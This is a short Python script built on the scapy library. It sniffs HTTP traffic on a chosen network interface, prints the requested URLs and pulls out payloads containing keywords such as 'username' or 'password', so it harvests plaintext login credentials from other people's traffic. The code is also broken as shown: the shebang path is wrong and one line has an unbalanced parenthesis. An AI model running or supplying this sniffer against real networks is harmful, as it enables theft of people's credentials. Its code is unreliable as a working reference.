#!/usr/env/bin python
import argparse
import scapy.all as scapy
from scapy.layers import http

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff on")
    args = parser.parse_args()
    if not args.interface:
        parser.error("No interface provided, use --help")
    # elif not args.target:
    #      parser.error("No target IP provided, use --help")
    return args

args = get_arguments()

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load))
            keywords = ["username", "user", "uname", "login", "pass", "password"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request:" + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Username/Password found: " + login_info + "\n\n")

sniff(args.interface)